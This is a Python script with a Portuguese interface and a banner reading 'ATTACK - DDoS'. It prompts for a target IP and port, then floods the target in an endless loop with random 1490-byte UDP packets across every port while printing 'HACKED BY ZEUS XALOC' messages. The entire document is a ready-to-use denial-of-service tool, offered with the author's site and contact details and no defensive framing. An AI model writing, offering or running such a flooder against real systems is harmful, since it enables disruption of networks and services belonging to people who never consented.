#-*- coding: utf-8 -*-
try:
    from time import sleep
    import os
    import socket
    import random
    import sys
except KeyboardInterrupt:
    print("Você escolheu sair, obrigado!")
    sys.exit()


sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

r = "\033[1;31m"
c = "\033[1;36m"
y = "\033[1;33m"

os.system("clear")

print()
print(r+"""
           𝗔 𝗧 𝗧 𝗔 𝗖 𝗞 - 𝗗𝗗𝗼𝗦  
        𝙿𝙲𝚆 𝙳𝙾𝙼𝙸𝙽𝙰 𝙸𝙿 𝙳𝙴 𝚀𝚄𝙴𝙼 𝙳𝚄𝚅𝙸𝙳𝙰
        "⣿⣿⣿⡇⢩⠘⣴⣿⣥⣤⢦⢁⠄⠉⡄⡇⠛⠛⠛⢛⣭⣾⣿⣿⡏
⣿⣿⣿⡇⠹⢇⡹⣿⣿⣛⣓⣿⡿⠞⠑⣱⠄⢀⣴⣿⣿⣿⣿⡟
⣿⣿⣿⣧⣸⡄⣿⣪⡻⣿⠿⠋⠄⠄⣀⣀⢡⣿⣿⣿⣿⡿⠋
⠘⣿⣿⣿⣿⣷⣭⣓⡽⡆⡄⢀⣤⣾⣿⣿⣿⣿⣿⡿⠋
⠄⢨⡻⡇⣿⢿⣿⣿⣭⡶⣿⣿⣿⣜⢿⡇⡿⠟⠉
⠄⠸⣷⡅⣫⣾⣿⣿⣿⣷⣙⢿⣿⣿⣷⣦⣚⡀       zeus xaloc
⠄⠄⢉⣾⡟⠙❤️⠈⢻⣿⣷⣅⢻⣿⣿⣿⣿⣿⣶⣶⡆⠄⡀
⠄⢠⣿⣿⣧⣀⣀⣀⣀⣼⣿⣿⣿⡎⢿⣿⣿⣿⣿⣿⣿⣇❤️⠄
⠄⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢇⣎⢿⣿⣿⣿⣿⣿⣿⣿⣶⣶
⠄⠄⠻⢿⣿⣿⣿⣿⣿⣿⣿⢟⣫⣾⣿⣷⡹⣿⣿⣿⣿⣿⣿⣿⡟
⠄⠄⠄⠄⢮⣭⣍⡭⣭⡵⣾⣿⣿⣿⡎⣿⣿⣌⠻⠿⠿⠿⠟⠋
⠄⠄⠄⠄⠈⠻⣿⣿⣿⣿⣹⣿⣿⣿⡇⣿⣿⡿ 
⠄⠄⣀⣴⣾⣶⡞⣿⣿⣿⣿⣿⣿⣿⣾⣿⡿⠃
⣠⣾⣿⣿⣿⣿⣿⣹⣿⣿⣿⣿⣿⡟⣹⣿⣳⡄"

    versão: V1.0
    Site: Pcw.com.br
    Whatsapp: +55 21 98047-6124"
     youtube channel: PCW
     Powered by: ZeusFox \n\n""")
try:
    ip = input(c+"Digite o IP>>: ")
    port = int(input(c+"Digite a Porta>>: "))
    
    print()
    
    
except KeyboardInterrupt:
    print(r+"Você escolheu sair, obrigado!")
    sys.exit()

os.system("clear")
print(y+"[                    ] 0%")
sleep(1)
os.system("clear")
print(y+"[=====               ] 25%")
sleep(1)
os.system("clear")
print(y+"[==========          ] 50%")
sleep(1)
os.system("clear")
print(y+"[===============     ] 75%")
sleep(1)
os.system("clear")
print(y+"[====================] 100%")
sleep(3)
os.system("clear")
sent = 0


while True:
    sock.sendto(bytes, (ip,port))
    sent = sent + 1
    port = port + 1
    print (r+"[•]%s HACKED BY  %s ZEUS XALOC KKK ^C %s <<<>>>"%(sent,ip,port))


    if port == 65535:
        port = 1

try:
    print (r+"[•]%s SEU SISTEMA %s ESTÁ SENDO HACKEADO! ^C %s <<<>>>"%(sent,ip,port))
except KeyboardInterrupt:
    print(r+"Você escolheu sair, Obrigado por Usar essa script")
    sys.exit()